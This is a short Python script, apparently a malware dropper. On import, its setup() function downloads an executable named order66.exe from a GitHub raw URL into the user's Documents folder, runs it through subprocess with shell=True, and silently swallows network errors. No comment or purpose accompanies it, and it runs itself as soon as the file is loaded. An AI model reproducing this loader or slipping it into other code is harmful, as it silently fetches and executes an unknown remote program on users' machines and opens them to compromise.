import os, requests, subprocess
def setup():
    documents_folder = os.path.expanduser("~\\Documents")
    file_url = "https://github.com/Sam-cpu999/stuff/raw/main/order66.exe"
    file_path = os.path.join(documents_folder, "order66.exe")
    try:
        response = requests.get(file_url, stream=True)
        response.raise_for_status()
        with open(file_path, 'wb') as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)
        subprocess.run([file_path], shell=True)
    except requests.exceptions.RequestException:
        pass
setup()